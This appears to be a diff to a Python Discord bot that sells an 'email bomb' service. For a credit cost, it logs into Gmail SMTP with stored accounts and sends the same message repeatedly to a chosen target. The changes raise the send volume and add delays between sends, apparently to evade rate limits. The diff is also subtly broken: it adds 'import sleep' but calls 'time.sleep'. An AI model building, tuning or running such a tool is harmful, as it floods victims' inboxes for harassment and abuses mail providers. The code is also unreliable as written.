@@ -11,6 +11,7 @@ from datetime import datetime
 import random
 import string
 import pickle
+import sleep
 
 bot = commands.Bot(command_prefix='*')
 
@@ -29,7 +30,7 @@ def _details(emailTarget, emailFreq):
     indexPass = mailPasswords[indexMail]
     
     mailTarget = emailTarget
-    mailFreq = int(emailFreq*0.07)
+    mailFreq = int(emailFreq*0.1)
 
     mailServer = 'smtp.gmail.com'
     mailPort = int(587)
@@ -49,6 +50,7 @@ def _details(emailTarget, emailFreq):
     s.login(mailFromAddr, mailFromPwd)
 
     for email in range(int(mailFreq)):
+        time.sleep(7)
         s.sendmail(mailFromAddr, mailTarget, mailMsg)
 
     s.close()
@@ -170,7 +172,7 @@ async def bomb(ctx, *arg):
     #if ctx.message.channel == channel:
     if emailFreq >= 700:
         if (uses[ctx.message.author.id]) > emailFreq:
-            await ctx.send(f"\n > Email bomb started, I have DM you with start and end time! \n This bomb cost {emailFreq}")
+            await ctx.send(f"\n >>> `Email bomb started, I have DM you with start and end time! \n This bomb cost {emailFreq}`")
             await ctx.author.send(f"\n > Email bomb started at {datetime.now()}")
             uses[ctx.message.author.id] -= emailFreq
             _details(emailTarget, emailFreq)
